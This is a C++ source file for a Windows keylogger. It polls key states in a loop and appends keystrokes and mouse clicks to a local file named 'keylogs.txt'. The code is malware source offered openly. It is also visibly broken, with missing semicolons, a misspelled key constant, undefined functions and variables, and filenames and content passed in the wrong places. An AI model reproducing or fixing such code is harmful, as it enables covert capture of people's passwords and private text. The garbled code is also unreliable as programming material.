#include <windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>
using namespace std;
class Keylogger{
public:
	void WriteToFile(string file_name){
		ofstream logkey; //Create object for file stream
		logkey.open(file_name,fstream::app);
		logkey << text; //Write text string to file
		logkey.close();
	}
bool CheckListKey(int key){
	string key;
switch(key){
	case VK_SPACE:
	cout << " ";//Space key log 
	this->WriteToFile(" ")
	break;
	case VK RETURN:
	cout << "\n";//Enter key log
	this->WriteToFile(" ")
	break;
	case VK_SHIFT:
	string shift = "<shiftkey>";
	cout << shift;//Shift key log
	this->WriteToFile(shift);
	case VK_BACK:
	cout << "\b";//Backspace key log
	WriteToFile("\b");
	break;
	case VK_RBUTTON:
	string rc = "<rclick>";
	cout<<rc;//Emulates backspace.
	WriteToFile(rc);
	break;
	case VK_LBUTTON:
	string lb = "<lbutton>";//Mouse Click.
	WriteToFile(lb);
	break;
default:
return false;
}
}
}

int main(){
Keylogger keylog;
Keylogger *keys = &keylog;
char key;
string filename = "keylogs.txt";
while(TRUE){
	Sleep(10);
	for(key = 8; key<=190;key++){
		if(GetAsyncKeyState(key) == -32767){
			if(KeyIsListed(key) == FALSE){
				cout<<key;
				ofstream file;
				file.open(filename);
				file << key;
				file.close()
			}
		}
	}
}
return 0;
}
